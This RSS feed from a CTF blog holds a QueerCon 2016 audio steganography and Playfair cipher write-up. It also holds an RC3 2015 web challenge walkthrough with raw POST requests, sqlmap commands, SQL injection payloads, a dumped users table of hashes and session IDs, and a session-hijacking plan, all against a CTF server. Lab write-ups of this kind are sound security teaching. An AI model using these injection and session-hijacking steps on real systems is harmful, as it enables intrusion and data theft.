<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Black Magic Exploitation</title>
    <description>This is the jekyllTheme example blog. It only exists to demonstrate how the theme looks and feels.</description>
    <link>/</link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
      <pubDate>Mon, 22 Aug 2016 18:37:09 -0700</pubDate>
    <lastBuildDate>Mon, 22 Aug 2016 18:37:09 -0700</lastBuildDate>
    <generator>Jekyll v3.1.6</generator>
    
      <item>
        <title>test</title>
        <description>&lt;h2 id=&quot;im-at-the-library&quot;&gt;Im at the library&lt;/h2&gt;
</description>
        <pubDate>Mon, 22 Aug 2016 04:29:33 -0700</pubDate>
        <link>/blog/ctf/stego/crypto/all/test</link>
        <guid isPermaLink="true">/blog/ctf/stego/crypto/all/test</guid>
        
        <category>Stego</category>
        
        <category>QueerCon</category>
        
        <category>Crypto</category>
        
        
        <category>CTF</category>
        
        <category>Stego</category>
        
        <category>Crypto</category>
        
        <category>All</category>
        
      </item>
    
      <item>
        <title>QueerCon 2016 ~ QC13 Soundcheck: Stego	</title>
        <description>&lt;p&gt;For those that don’t know - QueerCon is an LGBTQ subgroup of DefCon, the worlds largest hacking convention in the world. Every year they have 1-3 challenges a year. This was the first and can be located at the &lt;a href=&quot;https://www.queercon.org/contests/2016/06/29/qc13-soundcheck/&quot;&gt;QueerCon Contest Link&lt;/a&gt; where I was able to win a QueerCon 13 Badge for this years DefCon.&lt;/p&gt;

&lt;h2 id=&quot;contest-details&quot;&gt;&lt;strong&gt;Contest Details&lt;/strong&gt;&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;A beat to make you dance!

Do you like music? Have a good ear? Check out this hot beat from Stemodity. Get prizes!

Listen closely! Good luck!
&lt;/code&gt;&lt;/pre&gt;
&lt;figure&gt;
&lt;p class=&quot;text-center&quot;&gt;&lt;iframe width=&quot;75%&quot; height=&quot;166&quot; style=&quot;border: none;&quot; src=&quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/256697677&amp;amp;color=ff5500&amp;amp;auto_play=false&amp;amp;hide_related=false&amp;amp;show_comments=false&amp;amp;show_user=true&amp;amp;show_reposts=false&amp;amp;download=true&amp;amp;buying=false&quot;&gt;&lt;/iframe&gt;&lt;/p&gt;
   &lt;figcaption&gt; Stemodity - Crypto &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;pre&gt;&lt;code&gt;Think you have solved the puzzle? Care to find out? 

Send your find to answer (at) queercon (dot) org; and we will let you know.   

Give up? Stay tuned for clues! They will be posted around in various places; such as on our Mobile App or Facebook page.  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looks like we were given a song from Sound cloud. Given the clues, looks like there is some kind of hidden message in the song. Because the contest hinted:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Listen closely! Good luck!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I turned on the song for the next four hours while solving this puzzle to make sure it got stuck in my head.&lt;/p&gt;

&lt;p&gt;Like any stego expert I downloaded the &lt;a href=&quot;https://viviturtle.github.io/assets/queercon/Crypto [QueerCon13].mp3&quot;&gt;full song&lt;/a&gt; from SoundCloud and looked at its metadata using exiftool which I saved &lt;a href=&quot;https://viviturtle.github.io/assets/queercon/Metadata.txt&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;figure&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;https://asciinema.org/a/82493.js&quot; id=&quot;asciicast-82493&quot; async=&quot;&quot;&gt;&lt;/script&gt;
   &lt;figcaption&gt; Looking at the metadata&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;As you can see, we got nothing from here. Referencing a few audio &lt;a href=&quot;https://github.com/ctfs/write-ups-2015/tree/master/polictf-2015/forensics/its-hungry&quot;&gt;writeups&lt;/a&gt;, I thought I should try looking at its spectrogram. Using sox, the swiss army knife for audio manipulation, I made a spectrogram for the song. I did have some issues using sox with mp3 but I referenced &lt;a href=&quot;http://superuser.com/questions/421153/how-to-add-a-mp3-handler-to-sox/421168&quot;&gt;this super user post&lt;/a&gt; to convert it to a wav file or allow sox to run with mp3’s. After which I ran spectrogram command:&lt;/p&gt;

&lt;figure&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;https://asciinema.org/a/c9ysl2rg2y2qixhgzd8btxlgh.js&quot; id=&quot;asciicast-c9ysl2rg2y2qixhgzd8btxlgh&quot; async=&quot;&quot;&gt;&lt;/script&gt;
   &lt;figcaption&gt; Making the spectrogram&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;
   &lt;img src=&quot;/images/queercon/spectrogram.png&quot; /&gt;
   &lt;figcaption&gt;spectrogram.png&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;As you can see there are few areas where the signal magnitude values (dBFS) are super high (where its yellow). Next step is to isolate each of these areas using Sox. The command I used was:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; sox &amp;lt;audio file&amp;gt; -n trim &amp;lt;time&amp;gt; &amp;lt;duration&amp;gt; spectrogram -o &amp;lt;ouput file&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
  &lt;p&gt;sox Crypto\ [QueerCon13].mp3 -n trim 1 1 spectrogram -o spectrogram-1-1.png&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sox Crypto\ [QueerCon13].mp3 -n trim 10 5 spectrogram -o spectrogram-10-5.png&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sox Crypto\ [QueerCon13].mp3 -n trim 65 5	 spectrogram -o spectrogram-65-5.png&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sox Crypto\ [QueerCon13].mp3 -n trim 110 5 spectrogram -o spectrogram-110-5.png&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sox Crypto\ [QueerCon13].mp3 -n trim 169 5 spectrogram -o spectrogram-169-5.png&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The results were:&lt;/p&gt;

&lt;div class=&quot;album&quot;&gt;
   &lt;figure&gt;
      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/spectrogram-1-1.png&quot; /&gt;
      &lt;figcaption&gt;spectrogram-1-1.png&lt;/figcaption&gt;
   &lt;/figure&gt;
   &lt;figure&gt;
      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/spectrogram-10-5.png&quot; /&gt;
      &lt;figcaption&gt;spectrogram-10-5.png&lt;/figcaption&gt;
   &lt;/figure&gt;
    &lt;figure&gt;
      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/spectrogram-65-5.png&quot; /&gt;
      &lt;figcaption&gt;spectrogram-65-5.png&lt;/figcaption&gt;
   &lt;/figure&gt;   
   &lt;figure&gt;
      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/spectrogram-110-5.png&quot; /&gt;
      &lt;figcaption&gt;spectrogram-110-5.png&lt;/figcaption&gt;
   &lt;/figure&gt;   
   &lt;figure&gt;
      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/spectrogram-169-5.png&quot; /&gt;
      &lt;figcaption&gt;spectrogram-169-5.png&lt;/figcaption&gt;
   &lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;This was amazingly hard to decipher so I pulled up &lt;a href=&quot;http://www.sonicvisualiser.org/&quot;&gt;Sonic Visualizer&lt;/a&gt; which lets me see a live spectrogram. It also has more room for users to zoom in and out in the spectrogram. Usage: Open Audio File -&amp;gt;  Shift + G (Spectrogram layer) -&amp;gt; Double Click Bottom Right Visible Range scale to adjust to according dBFS level. This were the results:&lt;/p&gt;

&lt;div class=&quot;album&quot;&gt;
   &lt;figure&gt;
      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/sonic1.png&quot; /&gt;
      &lt;figcaption&gt;sonic1.png&lt;/figcaption&gt;
   &lt;/figure&gt;
   &lt;figure&gt;
      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/sonic2.png&quot; /&gt;
      &lt;figcaption&gt;sonic2.png&lt;/figcaption&gt;
   &lt;/figure&gt;
    &lt;figure&gt;
      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/sonic3.png&quot; /&gt;
      &lt;figcaption&gt;sonic3.png&lt;/figcaption&gt;
   &lt;/figure&gt;   
   &lt;figure&gt;
      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/sonic4.png&quot; /&gt;
      &lt;figcaption&gt;sonic4.png&lt;/figcaption&gt;
   &lt;/figure&gt;   
   &lt;figure&gt;
      &lt;img src=&quot;https://viviturtle.github.io/images/queercon/sonic5.png&quot; /&gt;
      &lt;figcaption&gt;sonic5.png&lt;/figcaption&gt;
   &lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;My deciphering got me to think this text was:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;SALD LESUW TNDI UIKX NPTUC&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;At this point in time I wasted a whole bunch time with ciphers at &lt;a href=&quot;http://rumkin.com/tools/cipher&quot;&gt;http://rumkin.com/tools/cipher&lt;/a&gt; such as caesars, vigenere…etc. Don’t get me wrong I know how most of these work, why rebuild the wheel? I didn’t really find anything here for a while. I tried other approaches such as looking at the metadata of the image that came along with the contest, but that didn’t give me anything either. I even listened to the song like 50 more times to see if I missed anything. You can say I wasted like four hours here:&lt;/p&gt;

&lt;figure&gt;
   &lt;img src=&quot;/images/queercon/musical_notes.jpg&quot; /&gt;
   &lt;figcaption&gt;musical_notes.jpg&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;Thinking I missed something back at &lt;a href=&quot;http://rumkin.com/tools/cipher&quot;&gt;http://rumkin.com/tools/cipher&lt;/a&gt;, I tried the ciphers again and eventually got a hit with the playfair cipher. &lt;strong&gt;NOTE: MAKE SURE YOU CHANGE TO DECRYPT INSTEAD OF ENCRYPT THE FIRST TIME TO MAKE SURE YOU DON’T WASTE FOUR HOURS TRYING OTHER CIPHERS&lt;/strong&gt;. As such I input the text we had &lt;em&gt;SALD LESUW TNDI UIKX NPTUC&lt;/em&gt; and I got:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;QCOA PARTY ROCK THIS HOUSE&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Something was obviously wrong with the first word so I looked back at the spectrograms and realized the “LD” in “SALD” was actually a “13” to make “SA13”. This translates the final ciphertext to:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;QC13 PARTY ROCK THIS HOUSE&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This was the 13th year for QueerCon so this made sense. I emailed contests@queercon.org which resulted in no response for a couple weeks. After which I saw on the QueerCon Facebook page that many people didn’t get replies. I emailed one of the other QC ubers and was finally able to confirm I got the right answer along with a cool QC badge!&lt;/p&gt;

&lt;figure&gt;
   &lt;img src=&quot;/images/queercon/QC13-Badge.jpg&quot; /&gt;
   &lt;figcaption&gt;QueerCon Badge &lt;br /&gt; *Photo from hackaday by Eric Evenchick*&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;If you want a review of this year’s badge feel free to head to &lt;a href=&quot;http://hackaday.com/2016/08/10/what-we-learned-from-the-2016-queercon-badge/&quot;&gt;http://hackaday.com/2016/08/10/what-we-learned-from-the-2016-queercon-badge/&lt;/a&gt; Thanks again QueerCon for the awesome and fun challenge&lt;/p&gt;
</description>
        <pubDate>Thu, 11 Aug 2016 04:29:33 -0700</pubDate>
        <link>/blog/ctf/stego/crypto/all/QC13-Soundcheck</link>
        <guid isPermaLink="true">/blog/ctf/stego/crypto/all/QC13-Soundcheck</guid>
        
        <category>Stego</category>
        
        <category>QueerCon</category>
        
        <category>Crypto</category>
        
        
        <category>CTF</category>
        
        <category>Stego</category>
        
        <category>Crypto</category>
        
        <category>All</category>
        
      </item>
    
      <item>
        <title>RC3 2015 ~ Top Secret: Web 400</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/start.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/start.png&quot; alt=&quot;start&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This was a pretty fun Web CTF question. In short summary this question was a SQL Injection exploit that used cookies and post methods. Most people that know how to do basic SQL injections, will only know how to do it from the URL (GET Method). This one used POST. Luckily I knew how to do POST SQLi from my curiosity when I first learned it, and luckily I had pre-installed CO2 Burp extension for a previous competition, which made the SQL injection exploit very simple.&lt;/p&gt;

&lt;p&gt;We given a link &lt;a href=&quot;http://162.243.171.85/&quot;&gt;http://162.243.171.85/&lt;/a&gt;. Upon visting the site we see a simple login.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/start_web.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/start_web.png&quot; alt=&quot;start_web&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;First thing you do for any Web Application Penetration Test is Recon and mapping. So I opened up Burp to record all my page visits, and used the web application normally. I registered for an account and looked at the default web page.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/Default_web.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/Default_web.png&quot; alt=&quot;Default_web&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We can clearly see three other pages. Home, Find Friends, and Logout. I tried a few of the pages.&lt;/p&gt;

&lt;figure&gt;
   &lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/home.png&quot; /&gt;
   &lt;figcaption&gt;Home &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;
   &lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/friends.png&quot; /&gt;
   &lt;figcaption&gt;Find Friends &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;The home page involves typing in some secret to store and displays it in a table. The Friends page shows other users. Trying to put it together, we need to find some way to get another person’s secret using the two pages. In other words, we need to find the admin’s secrets. After figuring this out, I tried to look at the actual requests.&lt;/p&gt;

&lt;figure&gt;
   &lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/burp_friends.png&quot; /&gt;
   &lt;figcaption&gt;Friends Request&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;pre&gt;&lt;code&gt;POST http://162.243.171.85/find.php HTTP/1.1
Host: 162.243.171.85
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://162.243.171.85/find.php
Cookie: PHPSESSID=e6f1641f4aeb281f0cf7287dc4c9e6be6aee4c0901514340b51f76d406b5a7228adb4187843f80fc378434c575dd47794f4d25c7bca81659670d48533dde583f
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

username=admin
&lt;/code&gt;&lt;/pre&gt;

&lt;figure&gt;
   &lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/burp_home.png&quot; /&gt;
   &lt;figcaption&gt;Home Request&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;pre&gt;&lt;code&gt;POST http://162.243.171.85/ HTTP/1.1
Host: 162.243.171.85
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://162.243.171.85/
Cookie: PHPSESSID=e6f1641f4aeb281f0cf7287dc4c9e6be6aee4c0901514340b51f76d406b5a7228adb4187843f80fc378434c575dd47794f4d25c7bca81659670d48533dde583f
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

secret=apple
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The only thing we should take note of, is that both of these pages use &lt;strong&gt;POST&lt;/strong&gt; methods to retrieve data, where “secret” and “username” are the pieces of data being sent. We can also see there is a &lt;strong&gt;PHPSESSID&lt;/strong&gt; to record the current user. Now let’s try some exploitation. First thing I tried was SQL injection. Let’s try escaping the SQL query using a &lt;strong&gt;‘&lt;/strong&gt; character.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/sqli.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/sqli.png&quot; alt=&quot;sqli&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This proves the Friends page is vulnerable to &lt;strong&gt;SQL injection&lt;/strong&gt;. I right clicked on the request in Burp: Right Click &amp;gt; Send to SQLMapper (a free Burp Extension by the CO2 Suite) and copied the SqlMap command. You will notice a data section for post parameters and a cookie value.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/sqlmapper.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/sqlmapper.png&quot; alt=&quot;sqlmapper&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sqlmap -u &#39;http://162.243.171.85:80/find.php&#39; --data=&#39;username=admin&#39; --cookie=&#39;PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now to try the exploit.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/images/rc3/TopSecret/dbs.png&quot;&gt;&lt;img src=&quot;https://viviturtle.github.io/images/rc3/TopSecret/dbs.png&quot; alt=&quot;dbs&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As you can see the application is clearly vulnerable and it works with SQLMap. If you don’t know what SQLmap it’s pretty much an automated tool to do SQL injectons. First I tested for database names (–dbs flag).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/rc3/TopSecret/dbs_output.txt&quot;&gt;dbs_output.txt&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;viviturtle@vivi-laptop:~$ sqlmap -u &#39;http://162.243.171.85:80/find.php&#39; --data=&#39;username=admin&#39; --cookie=&#39;PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d&#39; -p username --dbs
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150919}
|_ -| . | |     | .&#39;| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:37:55

[18:37:55] [INFO] resuming back-end DBMS &#39;mysql&#39; 
[18:37:55] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=test&#39; AND 7074=7074 AND &#39;UonP&#39;=&#39;UonP

    Type: error-based
    Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=test&#39; AND (SELECT 7296 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(7296=7296,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;DRrf&#39;=&#39;DRrf

    Type: AND/OR time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT)
    Payload: username=test&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))XSaB) AND &#39;wzNJ&#39;=&#39;wzNJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=test&#39; UNION ALL SELECT CONCAT(0x71717a6271,0x4f72664d694671504f4f,0x7176627071),NULL-- 
---
[18:37:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0
[18:37:56] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] TopSecret

[18:37:56] [INFO] fetched data logged to text files under &#39;/home/viviturtle/.sqlmap/output/162.243.171.85&#39;

[*] shutting down at 18:37:56

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It gave us the default database, information_schema and one other, TopSecret. Using the Top Secret Database, I tried to see what tables were in there; -D TopSecret –tables (-D to choose DB and –tables to find tables).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/rc3/TopSecret/table_output.txt&quot;&gt;table_output.txt&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;viviturtle@vivi-laptop:~$ sqlmap -u &#39;http://162.243.171.85:80/find.php&#39; --data=&#39;username=admin&#39; --cookie=&#39;PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d&#39; -p username -D TopSecret --tables
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150919}
|_ -| . | |     | .&#39;| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:38:35

[18:38:35] [INFO] resuming back-end DBMS &#39;mysql&#39; 
[18:38:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=test&#39; AND 7074=7074 AND &#39;UonP&#39;=&#39;UonP

    Type: error-based
    Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=test&#39; AND (SELECT 7296 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(7296=7296,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;DRrf&#39;=&#39;DRrf

    Type: AND/OR time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT)
    Payload: username=test&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))XSaB) AND &#39;wzNJ&#39;=&#39;wzNJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=test&#39; UNION ALL SELECT CONCAT(0x71717a6271,0x4f72664d694671504f4f,0x7176627071),NULL-- 
---
[18:38:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0
[18:38:35] [INFO] fetching tables for database: &#39;TopSecret&#39;
Database: TopSecret
[1 table]
+-------+
| users |
+-------+

[18:38:35] [INFO] fetched data logged to text files under &#39;/home/viviturtle/.sqlmap/output/162.243.171.85&#39;

[*] shutting down at 18:38:35

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It had one table, users. Let’s dump this table:  -D TopSecret -T users –dump(-D to choose DB, -T to choose table and –dump to dump the table).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/rc3/TopSecret/dump.txt&quot;&gt;dump.txt&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;viviturtle@vivi-laptop:~$ sqlmap -u &#39;http://162.243.171.85:80/find.php&#39; --data=&#39;username=admin&#39; --cookie=&#39;PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d&#39; -p username -D TopSecret -T users --dump
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150919}
|_ -| . | |     | .&#39;| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:39:00

[18:39:01] [INFO] resuming back-end DBMS &#39;mysql&#39; 
[18:39:01] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=test&#39; AND 7074=7074 AND &#39;UonP&#39;=&#39;UonP

    Type: error-based
    Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=test&#39; AND (SELECT 7296 FROM(SELECT COUNT(*),CONCAT(0x71717a6271,(SELECT (ELT(7296=7296,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;DRrf&#39;=&#39;DRrf

    Type: AND/OR time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT)
    Payload: username=test&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))XSaB) AND &#39;wzNJ&#39;=&#39;wzNJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=test&#39; UNION ALL SELECT CONCAT(0x71717a6271,0x4f72664d694671504f4f,0x7176627071),NULL-- 
---
[18:39:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0
[18:39:01] [INFO] fetching columns for table &#39;users&#39; in database &#39;TopSecret&#39;
[18:39:01] [INFO] fetching entries for table &#39;users&#39; in database &#39;TopSecret&#39;
[18:39:01] [INFO] analyzing table dump for possible password hashes
Database: TopSecret
Table: users
[32 entries]
+----+-------+--------------------+----------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+
| id | admin | username           | password                                                                                                                         | session                                                                                                                          |
+----+-------+--------------------+----------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+
| 1  | 0     | admin              | 0cc8ad13e3adc57abde1fcb81ae3c9896be04eb27a1411988475cedea5ac6553473de16afaf71c2a546f6bd868b859d6ef1cd065abd6f92e75e22aa4bfecce0a | 3f44e5dedf6b06b5da8c6e5ec7c0f4304f334a2ff2b1da3654942bab969e89765dae32faeabefdc0cf15d506c5146d96289dfa9929af7f60d65055d978e406ec |
| 2  | 0     | dad                | 2d5ca061b638b0d44e337ed5b6ae1eccee72e20794fa98d294b779d65126bd710103a9df137dc4a495fd3059c7ffbc12b7968b49d1a008b9ca860372507a8670 | 3aa746aaed1989910fc64e8bbf6cfa47ca954caa7552b26519fc06c42bf13694e561655ffe2c4b9cee1bddd3771658bd54d7cab82ff807a8619143ae61c562b2 |
| 3  | 0     | asdf               | ce57d8bc990447c7ec35557040756db2a9ff7cdab53911f3c7995bc6bf3572cda8c94fa53789e523a680de9921c067f6717e79426df467185fc7a6dbec4b2d57 | 0a17137c74e6f2ecf86d9920972d10bbc71fde1d99d03864989dcf7406e3f9f7750fb3751d3f497a24fb29ffcda05fba8af48cfd52c1f204f109bc075cb4fe34 |
| 4  | 0     | test               | 560b30a00786abd7c6fb7219dabe7cfc53c9fb952c31719193c16d2d3582164e64b9b11381c49e3cfb6195375f496610dbe09204c2c8bf0486fece673ef24e8d | 
...
+----+-------+--------------------+----------------------------------------------------------------------------------------------------------------------------------+----------------------------------------------------------------------------------------------------------------------------------+

[18:39:01] [INFO] table &#39;TopSecret.users&#39; dumped to CSV file &#39;/home/viviturtle/.sqlmap/output/162.243.171.85/dump/TopSecret/users.csv&#39;
[18:39:01] [INFO] fetched data logged to text files under &#39;/home/viviturtle/.sqlmap/output/162.243.171.85&#39;

[*] shutting down at 18:39:01

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We are given a table with the columns, ID, admin, username, password, and session. The password is hashed somehow, so we can’t use that unless we want to bruteforce the hash. The only other option is to use the session. As you can see it’s stored in the SQL Database. This is bad practice, because session ids should be stored and randomized by the application per login and not stored in a SQL database. Since we have this session id, we can impersonate anyone on the database. Let’s impersonate the admin in order to get their secrets.&lt;/p&gt;

&lt;p&gt;Let’s log back into the web application and check out the home page. We can either change the cookie values in our browser or just do it through Burp. We are going to use the latter. If you recall looking at the request for the Home page, it contains a PHPSESSID.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;POST http://162.243.171.85/ HTTP/1.1
Host: 162.243.171.85
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://162.243.171.85/
